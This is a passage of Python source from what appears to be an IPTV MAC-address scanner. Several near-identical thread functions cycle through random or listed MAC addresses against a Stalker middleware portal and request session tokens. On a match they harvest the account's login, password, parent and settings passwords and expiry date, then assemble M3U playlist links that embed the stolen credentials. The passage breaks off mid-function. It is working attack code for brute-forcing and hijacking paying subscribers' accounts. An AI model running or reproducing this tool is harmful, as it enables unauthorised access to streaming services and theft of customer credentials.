                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d12():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(12, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_12"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d13():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(13, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_13"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d14():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(14, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_14"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
